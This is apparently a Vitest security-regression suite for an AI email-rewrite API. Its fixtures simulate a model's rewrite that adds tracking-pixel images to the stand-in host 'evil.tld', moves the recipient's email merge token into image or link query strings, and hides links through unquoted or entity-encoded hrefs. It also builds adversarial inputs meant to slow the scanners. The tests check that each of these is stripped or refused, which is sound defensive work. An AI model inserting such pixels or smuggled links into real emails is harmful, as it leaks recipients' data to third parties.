/**
 * AI rewrite hardening (security review of 7fdf95eb).
 *
 *  HIGH-1  the model cannot add an image (a tracking pixel), and no merge token may end up inside a
 *          link or image address it did not already sit in; the preview never fetches an image.
 *  HIGH-2  links are checked on the parsed, sanitised output, so an unquoted href, a '>' inside an
 *          earlier attribute or an entity-encoded address cannot slip past.
 *  MEDIUM  the token scanner, the template-token check, unchipify and the content score are linear,
 *          and the limiter runs before any of them.
 *  LOW     one 30 s deadline across provider attempts; quoted '>' in an image attribute; a
 *          plain-text draft previews as plain text.
 */
import { vi, describe, it, expect, beforeEach, afterEach, afterAll } from 'vitest';
import { NextRequest } from 'next/server';

const session = { current: null as unknown };
const mockGenerate = vi.fn();

vi.mock('@/auth', () => ({ auth: vi.fn(), handlers: {}, signIn: vi.fn(), signOut: vi.fn() }));
vi.mock('@/lib/auth', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/lib/auth')>();
  return { ...actual, requireAuth: async () => session.current };
});
vi.mock('@/lib/ai/generation', () => ({ generateStructured: (...a: unknown[]) => mockGenerate(...a) }));

import { protectTokens, templateTokens, sameTemplateTokens, rewriteInputProblem } from '@/lib/compose/rewrite';
import { sanitizePreviewHtml, unchipifyMergeTags, htmlToPlainText } from '@/lib/compose/html';
import { scoreContent } from '@/lib/compose/contentScore';
import { isHtml } from '@/lib/email/sanitize';
import { REWRITE_DEADLINE_MS } from '@/lib/ai/composeRewrite';
import { POST as rewritePost } from '@/app/api/ai/compose-rewrite/route';
import { __setAttemptLimitRedis } from '@/lib/security/attemptLimit';

const counters = new Map<string, number>();
const incr = vi.fn(async (k: string) => { counters.set(k, (counters.get(k) ?? 0) + 1); return counters.get(k)!; });
const useRedis = () => {
  counters.clear();
  __setAttemptLimitRedis({ incr, expire: async () => 1, ttl: async () => 42, del: async () => 1 });
};

const rep = { id: 'user-a', tenantId: 'tenant-a', role: 'sdr', email: 'a@t.test', firstName: 'Mei' };
const post = (body: unknown) =>
  rewritePost(new NextRequest('http://localhost/api/ai/compose-rewrite', { method: 'POST', body: JSON.stringify(body), headers: { 'content-type': 'application/json' } }));

function modelEdits(edit: (masked: string) => string) {
  mockGenerate.mockImplementation(async (input: { userPrompt: string }, parse: (raw: string) => unknown) => {
    const masked = /<<<EMAIL_DRAFT\n([\s\S]*?)\nEMAIL_DRAFT>>>/.exec(input.userPrompt)![1];
    return { available: true, data: parse(JSON.stringify({ body: edit(masked) })) };
  });
}

const DRAFT =
  '<p>Hi {{firstName|there}}, I am {{senderFullName}} ({{email}}).</p>' +
  '<p>See <a href="https://telestar.test/demo">the demo</a>.</p>' +
  '<p><img src="https://cdn.test/logo.png" alt="a>b"></p>';

afterAll(() => __setAttemptLimitRedis(null));
beforeEach(() => {
  vi.clearAllMocks();
  useRedis();
  session.current = rep;
});

const timed = (f: () => unknown) => { const start = performance.now(); f(); return performance.now() - start; };

describe('HIGH-1: no new image, no token moved into an address', () => {
  for (const [label, img] of [
    ['double-quoted', '<img src="https://evil.tld/p.gif">'],
    ['single-quoted', "<img src='https://evil.tld/p.gif'>"],
    ['unquoted', '<img src=https://evil.tld/p.gif>'],
  ] as const) {
    it(`strips an image the model added (${label} src)`, async () => {
      modelEdits((m) => `${m}<p>${img}</p>`);
      const res = await post({ action: 'friendlier', body: DRAFT });
      const data = await res.json();
      if (res.status === 200) {
        expect(data.body).not.toContain('evil.tld');
        expect((data.body.match(/<img\b/g) ?? []).length).toBe(1);
        expect(data.body).toContain('src="https://cdn.test/logo.png"');
      } else {
        expect(res.status).toBe(422);
      }
    });
  }

  it('refuses a merge token moved into an image address', async () => {
    // [[T3]] is {{email}}.
    modelEdits((m) => `${m.replace('([[T3]])', '')}<p><img src="https://evil.tld/p.gif?e=[[T3]]"></p>`);
    const res = await post({ action: 'friendlier', body: DRAFT });
    if (res.status === 200) expect((await res.json()).body).not.toContain('evil.tld');
    else expect(res.status).toBe(422);
  });

  it('refuses a merge token moved into a link address', async () => {
    modelEdits((m) => m.replace('([[T3]])', '').replace('https://telestar.test/demo', 'https://telestar.test/demo?e=[[T3]]'));
    const res = await post({ action: 'friendlier', body: DRAFT });
    expect(res.status).toBe(422);
    expect((await res.json()).reason).toMatch(/token_in_link|link_changed/);
  });

  it('refuses a rewrite that lost an original image', async () => {
    modelEdits((m) => m.replace(/\[\[T4\]\]/, ''));
    expect((await post({ action: 'shorten', body: DRAFT })).status).toBe(422);
  });

  it('the preview drops every image address, however it is quoted', () => {
    for (const img of ['<img src="https://x.tld/a.gif">', "<img src='https://x.tld/a.gif'>", '<img src=https://x.tld/a.gif>', '<img alt="a>b" src="https://x.tld/a.gif">']) {
      const out = sanitizePreviewHtml(`<p>hi</p>${img}`);
      expect(out).not.toContain('x.tld');
      expect(out).toContain('<p>hi</p>');
    }
  });
});

describe('HIGH-2: links checked on the parsed output', () => {
  for (const [label, evil] of [
    ['unquoted href', '<a href=https://evil.tld>x</a>'],
    ["a '>' inside an earlier attribute", '<a title=">" href="https://evil.tld">x</a>'],
    ['an entity-encoded href', '<a href="&#104;ttps://evil.tld">x</a>'],
    ['a hex-entity href', '<a href="https&#x3a;//evil.tld">x</a>'],
  ] as const) {
    it(`refuses ${label}`, async () => {
      modelEdits((m) => `${m}<p>${evil}</p>`);
      const res = await post({ action: 'formal', body: DRAFT });
      expect(res.status).toBe(422);
      expect((await res.json()).reason).toBe('link_changed');
    });
  }

  it('accepts the original link written differently (entities, quotes)', async () => {
    modelEdits((m) => m.replace('href="https://telestar.test/demo"', "href='https&#58;//telestar.test/demo'"));
    expect((await post({ action: 'formal', body: DRAFT })).status).toBe(200);
  });

  it('refuses a bare URL added to a plain-text draft', async () => {
    modelEdits((m) => `${m}\n\nMore at https://evil.tld/x`);
    const res = await post({ action: 'formal', body: 'Hi {{firstName}},\n\nsee https://telestar.test/demo' });
    expect(res.status).toBe(422);
  });
});

describe('MEDIUM-1: linear scanning, limiter first', () => {
  const adversarial = ['{a'.repeat(30_000), '{{'.repeat(30_000), '{{#if a}}'.repeat(6_000), '{a|'.repeat(20_000), '[[T'.repeat(20_000), '<img '.repeat(12_000), '<img alt="'.repeat(6_000)];

  it('protectTokens, templateTokens and sameTemplateTokens finish fast on adversarial input', () => {
    for (const text of adversarial) {
      expect(timed(() => protectTokens(text))).toBeLessThan(200);
      expect(timed(() => templateTokens(text))).toBeLessThan(200);
      expect(timed(() => sameTemplateTokens(text, text))).toBeLessThan(400);
    }
  });

  it('unchipify, isHtml and htmlToPlainText are linear', () => {
    for (const text of ['<span data-merge-tag="a" '.repeat(2_400), '<span '.repeat(10_000), '<a'.repeat(30_000), '<li '.repeat(15_000), `${' '.repeat(60_000)}a`]) {
      expect(timed(() => unchipifyMergeTags(text))).toBeLessThan(200);
      expect(timed(() => isHtml(text))).toBeLessThan(200);
      expect(timed(() => htmlToPlainText(text))).toBeLessThan(400);
    }
  });

  it('unchipify still turns chips back into tags', () => {
    expect(unchipifyMergeTags('<p>Hi <span data-merge-tag="firstName" data-fallback="there">{{firstName|there}}</span>!</p>')).toBe('<p>Hi {{firstName|there}}!</p>');
    expect(unchipifyMergeTags('<SPAN class="x" data-merge-tag="company" data-fallback="">x</SPAN>')).toBe('{{company}}');
    expect(unchipifyMergeTags('<span data-merge-tag="bad name">x</span>')).toBe('');
    expect(unchipifyMergeTags('<span class="plain">keep</span>')).toBe('<span class="plain">keep</span>');
  });

  it('refuses a draft with too much template syntax before any parsing', () => {
    expect(rewriteInputProblem('{'.repeat(2_001))).not.toBeNull();
    expect(rewriteInputProblem('<img src="https://a.test/x.png">'.repeat(101))).not.toBeNull();
    expect(rewriteInputProblem('<p>Hi {{firstName}}</p>')).toBeNull();
  });

  it('the route counts the attempt before it parses, and answers an adversarial draft fast', async () => {
    const start = performance.now();
    const res = await post({ action: 'shorten', body: '{a'.repeat(29_000) });
    expect(performance.now() - start).toBeLessThan(500);
    expect(res.status).toBe(413);
    expect(incr).toHaveBeenCalled();
    expect(mockGenerate).not.toHaveBeenCalled();
  });
});

describe('MEDIUM-2: the content score is linear', () => {
  it('scores adversarial drafts fast', () => {
    for (const body of ['<a '.repeat(20_000), '<li '.repeat(15_000), `${'.'.repeat(30_000)}a`, '{{a '.repeat(15_000), '{{#if '.repeat(10_000), `<p>${' '.repeat(50_000)}x</p>`]) {
      expect(timed(() => scoreContent({ subject: 'x'.repeat(5_000), body }))).toBeLessThan(200);
    }
  });
});

describe('LOW', () => {
  afterEach(() => vi.useRealTimers());

  it('L1: one deadline across every provider attempt', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
    mockGenerate.mockImplementation(() => new Promise(() => undefined));
    const pending = post({ action: 'shorten', body: 'Hi there.' });
    await vi.advanceTimersByTimeAsync(REWRITE_DEADLINE_MS + 10);
    const res = await pending;
    expect(res.status).toBe(504);
    expect(mockGenerate.mock.calls[0][0].timeoutMs).toBeLessThanOrEqual(REWRITE_DEADLINE_MS);
  });

  it('L2: an image with a quoted ">" is one token', () => {
    const p = protectTokens('<p><img alt="a>b" src="https://cdn.test/x.png"> after</p>');
    expect(p.tokens).toEqual(['<img alt="a>b" src="https://cdn.test/x.png">']);
    expect(p.masked).toBe('<p>[[T1]] after</p>');
  });

  it('L3: a plain-text draft comes back marked as text, even when it reads like markup', async () => {
    modelEdits((m) => `<p>${m} &lt;b&gt;bold&lt;/b&gt;</p>`);
    const res = await post({ action: 'formal', body: 'Hi {{firstName}}, thanks.' });
    const data = await res.json();
    expect(data.format).toBe('text');
    expect(data.body).toContain('<b>bold</b>');
  });

  it('an HTML draft comes back marked as html', async () => {
    modelEdits((m) => m);
    expect((await (await post({ action: 'formal', body: DRAFT })).json()).format).toBe('html');
  });
});
